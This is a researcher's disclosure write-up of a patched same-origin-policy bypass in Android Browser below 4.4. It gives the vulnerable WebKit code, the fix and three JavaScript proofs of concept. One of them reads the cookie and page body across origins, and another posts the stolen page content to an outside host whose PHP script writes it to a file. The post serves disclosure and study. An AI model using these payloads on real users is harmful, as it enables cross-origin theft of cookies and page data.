---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-06-01_a-tale-of-another-sop-bypass-in-android-browser-44.md
original_filename: 2017-06-01_a-tale-of-another-sop-bypass-in-android-browser-44.md
title: A Tale Of Another SOP Bypass In Android Browser < 4.4
category: documents
detected_topics:
- supply-chain
- jwt
- command-injection
- api-security
- mobile-security
tags:
- imported
- documents
- supply-chain
- jwt
- command-injection
- api-security
- mobile-security
language: en
raw_sha256: 99cca6f0fbec739127f13500eef7988535bee04b4897f363f1d74bc0d808adf0
text_sha256: 1e9998d82bb50a168684e19ed191542eae65abb2e59bf2b7908a50935372fb06
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# A Tale Of Another SOP Bypass In Android Browser < 4.4

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-06-01_a-tale-of-another-sop-bypass-in-android-browser-44.md
- Source Type: markdown
- Detected Topics: supply-chain, jwt, command-injection, api-security, mobile-security
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `99cca6f0fbec739127f13500eef7988535bee04b4897f363f1d74bc0d808adf0`
- Text SHA256: `1e9998d82bb50a168684e19ed191542eae65abb2e59bf2b7908a50935372fb06`


## Content

---
title: "A Tale Of Another SOP Bypass In Android Browser < 4.4"
page_title: "A Tale Of Another SOP Bypass In Android Browser < 4.4 - Miscellaneous Ramblings of a Cyber Security Researcher"
url: "https://www.rafaybaloch.com/2017/06/a-tale-of-another-sop-bypass-in-android.html"
final_url: "https://www.rafaybaloch.com/2017/06/a-tale-of-another-sop-bypass-in-android.html"
authors: ["Rafay Baloch (@rafaybaloch)"]
programs: ["Google"]
bugs: ["SOP bypass"]
publication_date: "2017-06-01"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6187
---

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg21wZWJrAE48jZO9c1AX_3BoeEnWm_p7iEbtXQ-Gb5MxKMY30e5twoHgR4zWf5oaIBvEhb0BBewQkYChSYusj11lgxUTbwVzril1t_xffBob-2WIEemAZFDZXmQXE8garh5W9BeQgEklw/s1600/Pirate.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg21wZWJrAE48jZO9c1AX_3BoeEnWm_p7iEbtXQ-Gb5MxKMY30e5twoHgR4zWf5oaIBvEhb0BBewQkYChSYusj11lgxUTbwVzril1t_xffBob-2WIEemAZFDZXmQXE8garh5W9BeQgEklw/s1600/Pirate.jpg)

  
Since, my recent [android SOP bypass [CVE-2014-6041]](http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html) triggered a lot of eruption among the infosec community, I was motivated to research a bit more upon the android browser, it turns out that things are much worse than I thought, I managed to trigger quite a few interesting vulnerabilities inside of Android browser, one of them being another Same Origin Policy Bypass vulnerability. The thing that makes it worse was the same SOP bypass was already [fixed](http://trac.webkit.org/changeset/96826) inside of chrome years ago, however the patches were not applied to Android browser < 4.4.  
  

####  Proof Of Concept

The following is the proof of concept:  
  
<script>  
window.onload = function()  
{  
object = document.createElement("object");  
object.setAttribute("data", "http://www.bing.com");  
document.body.appendChild(object);  
object.onload = function() {  
object.setAttribute("data", "javascript:alert(document.domain)");  
object.innerHTML = "foobar";  
}  
}  

</script>

  

  
The POC is very easy to understand for individuals having some javaScript background. However, for others let me break it down for you. The above code creates an object with data attribute, which loads up a URL from another origin in this case "**http://www.bing.com** ", however once it's loaded, we replace bing.com with "javascript:alert(document.domain)". The interesting thing here is that the last line is essential for the POC to work **object.innerHTML = "foobar";** so that the navigation request is performed  
  
Let's take a look at the vulnerable code that is responsible for the causing the issue:  

####  Vulnerable Code

bool HTMLPlugInImageElement::allowedToLoadFrameURL(const String& url)  
{  
ASSERT(document());  
ASSERT(document()->frame());  
if (document()->frame()->page()->frameCount() >= Page::maxNumberOfFrames)  
return false;  
** _KURL completeURL = document()- >completeURL(url);_**  
  
  
The above function is responsible for loading up the frame URL, if you take a close look at the code, you would find out that there is no validation for javascript scheme, which allows us to execute javaScript in context of the frame that was loaded.  

####  The fix

The issue was [fixed ](https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef%5E%21/#F0)by applying the following checks from **securityorigin.h** library.  
  
if (contentFrame() && protocolIsJavaScript(completeURL)  
&& !document()->securityOrigin()->canAccess(contentDocument()->securityOrigin()))  
return false;  

####  Proof Of Concept Using Postmessage Call

To help understand the vulnerability better and get to the root cause, i contacted Joe Vennix from metasploit team, who modified my original POC to the following to help demonstrate the vulnerability in an effective manner. The following POC uses postMessage call from HTML 5 world to send the document.cookie and innerHTML to the main window.  
  
<script>  
window.onload = function()  
{  
object = document.createElement("object");  
object.setAttribute("data", "http://www.bing.com");  
document.body.appendChild(object);  
object.onload = function() {  
object.data = "javascript:var t=top;with(document)t.postMessage('HTML='+body.innerHTML+'&COOKIE='+cookie,'*');";  
object.innerHTML = "foobar";  
}  
}  
  
window.onmessage = function(m){  
alert(m.data);  
}  
</script>  
  

####  Proof Of Concept To Steal Data Across Domains

A great friend of mine @filedescriptor helped me with the following POC, which steals data from bing.com by accessing the document.body.innerHTML property as submits that data cross origin by using a POST request, since you can send limited amount of data with GET due to browser restrictions.  
  
<script>  
window.onload = function()  
{  
object = document.createElement("object");  
object.setAttribute("data", "http://www.bing.com");  
document.body.appendChild(object);  
object.onload = function() {  
object.data = "javascript:with(document)body.innerHTML+='<form method=post action=//kcal.pw/record.php?name=__target=_><input name=content></form><iframe name=_>',__.content.value=body.innerHTML,__.submit()";  
object.innerHTML = "foobar";  
}  
}

  
The PHP file hosted at record.php contains the following line, which saves the data coming from bing.com to a file called record.txt.  
**  
****file_put_contents('record.txt', $_POST['content']);**  
  
The following are some of the handsets that we used to test and verify this vulnerability.  

####  Sony Xperia

**  
**  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjvO_wAZvKVG2ga0BMvmF1epPRUPYf7Ntr2Twzh7DyyEXk20vyQ_7V3Gdm5SXcbiXyT05f5hTqHb5pei-1YlZykE6L1fx11yqr7X0lR4WND2WQULwG4yN7neROlT0c5j7brWBjQKDYeyc/s1600/SONY.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjvO_wAZvKVG2ga0BMvmF1epPRUPYf7Ntr2Twzh7DyyEXk20vyQ_7V3Gdm5SXcbiXyT05f5hTqHb5pei-1YlZykE6L1fx11yqr7X0lR4WND2WQULwG4yN7neROlT0c5j7brWBjQKDYeyc/s1600/SONY.png)

####  LGNexus4

  
**  
**  

  

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZImrM_qMRlubcJCmvIHhNwJuxFuqghIYZttnJpdCClvfhXrDPzB0kHlq_UeVTXCG0QI8nytSEdqnBkOxLb0_LrBC3s1LjUlX4XhjHq_Hy9o8YE9S6WYKgMNtEhIEywGolMcTWg7zBBag/s1600/LGNEXUS.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZImrM_qMRlubcJCmvIHhNwJuxFuqghIYZttnJpdCClvfhXrDPzB0kHlq_UeVTXCG0QI8nytSEdqnBkOxLb0_LrBC3s1LjUlX4XhjHq_Hy9o8YE9S6WYKgMNtEhIEywGolMcTWg7zBBag/s1600/LGNEXUS.png)

**  
**

####  Samsung Galaxy S3

**  
**

**  
**

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDb8DE2cZaPk5eKjsoAYvYZEZdRjEGO_FUoQJ4tTUJvh-qky9reZS0LBXjp35cq960-4sYZBEQFsvbgphNocdNB381uDW-I8NrJBJ0wf2YD3_0VGBRYcOdWpDxNw8TjNIsmz206piRRUw/s1600/samsung+galaxy+s3.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDb8DE2cZaPk5eKjsoAYvYZEZdRjEGO_FUoQJ4tTUJvh-qky9reZS0LBXjp35cq960-4sYZBEQFsvbgphNocdNB381uDW-I8NrJBJ0wf2YD3_0VGBRYcOdWpDxNw8TjNIsmz206piRRUw/s1600/samsung+galaxy+s3.png)

**  
**

**  
**

####  Safari Browser 5.0

**  
**

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhndHoYQOpi4KMDyVJoy1KQGBGM-scq9JWKbabN2ZjVmLVZJlnfkEQpkLEiUBlPwAQJb7cfR7-1j24Rq4Q2bXKmUfx1qSjIeXJoCcMpamH7geRjQklmOCGiQ0bNej8FKzUJaaPFBfurlbM/s1600/safari+5.0.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhndHoYQOpi4KMDyVJoy1KQGBGM-scq9JWKbabN2ZjVmLVZJlnfkEQpkLEiUBlPwAQJb7cfR7-1j24Rq4Q2bXKmUfx1qSjIeXJoCcMpamH7geRjQklmOCGiQ0bNej8FKzUJaaPFBfurlbM/s1600/safari+5.0.png)

  

####  Google's Response

The vulnerability was responsibly disclosed to Google on 9/25/2014, The vulnerability was fixed on 10/1/2014 and the patches have been released [here](https://android.googlesource.com/platform/external/webkit/+/109d59bf6fe4abfd001fc60ddd403f1046b117ef).  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUEl9VYNpmUnskOhXMOJ-yx6DuB_ey-C7j1xsutr3wgHewTsaskcecBVT0eLUbSE6s9Q88p_rC3GVf67OuiaWgbdUFemTMPXHA14csFreaCUfBcnd8eSiXRHM4wajhC1sxcvRX_Lme4Xc/s1600/jb.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUEl9VYNpmUnskOhXMOJ-yx6DuB_ey-C7j1xsutr3wgHewTsaskcecBVT0eLUbSE6s9Q88p_rC3GVf67OuiaWgbdUFemTMPXHA14csFreaCUfBcnd8eSiXRHM4wajhC1sxcvRX_Lme4Xc/s1600/jb.png)

####  In Closing

There are tons of other browsers with huge userbase that are vulnerable to same vulnerability, Maxthon, CM Browser, Safari Browser 5.0 to name a few. In case if you are still using Android browser or any of other browser, you should immediately apply patches or switch to Chrome or firefox. I believe there are several other vulnerabilities that were addresses in chrome webkit and still have not been addressed inside of Android browser, therefore it is recommended to avoid it completely.  
  
**  
****Press Coverage**  
  
http://news.yahoo.com/half-android-phones-still-vulnerable-massive-privacy-bug-135551464.html  
  
http://www.redmondpie.com/massive-privacy-bug-affects-many-android-devices-heres-how-to-protect-yourself/  
  
http://threatpost.com/second-same-origin-policy-bypass-flaw-haunts-android-browser  
  
http://www.securityweek.com/google-patches-second-same-origin-policy-bypass-flaw-android-browser  
  
http://www.pcworld.com/article/2823012/almost-half-of-android-devices-still-have-a-vulnerable-browser-installed.html  
  
http://www.csoonline.com/article/2690910/application-security/android-browser-flaw-found-to-leak-data.html  
  
http://tribune.com.pk/story/771546/on-a-roll-another-bug-exposed-by-pakistani-researcher/  
  
https://blog.lookout.com/blog/2014/10/06/aosp-browser-vuln/  
  
http://www.net-security.org/secworld.php?id=17459  
  
http://www.zdnet.com/half-of-all-android-devices-still-vulnerable-to-privacy-disaster-browser-bug-7000034500/  
  
http://www.cio.com.au/article/556967/almost-half-android-devices-still-vulnerable-browser-installed/?fp=16&fpid=1  
  
http://www.computerworld.com/article/2822813/45-of-android-devices-still-have-a-vulnerable-browser-installed.html#tk.rss_all  
  
http://tribune.com.pk/story/776018/bugged-half-of-android-users-vulnerable-to-privacy-disaster/  
  
http://checkmarx.com/2014/10/21/pakistani-ethical-hacker/
